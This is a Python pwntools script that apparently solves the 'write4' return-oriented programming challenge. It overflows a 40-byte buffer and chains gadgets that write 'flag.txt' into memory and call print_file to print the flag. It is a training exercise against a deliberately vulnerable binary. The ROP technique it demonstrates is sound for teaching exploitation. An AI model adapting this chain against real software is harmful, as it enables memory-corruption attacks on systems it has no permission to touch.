#/usr/bin/python3
from pwn import process, p64, log

shell = process("./write4")

offset = 40
junk = b"A" * offset

data = p64(0x601028)

pop_r14_r15 = p64(0x400690)
mov_r14_r15 = p64(0x400628)
pop_rdi = p64(0x400693)
ret = p64(0x4004e6)

print_file = p64(0x400510)

payload  = b""
payload += junk
payload += pop_r14_r15 + data + b"flag.txt"
payload += mov_r14_r15
payload += pop_rdi + data
payload += ret
payload += print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
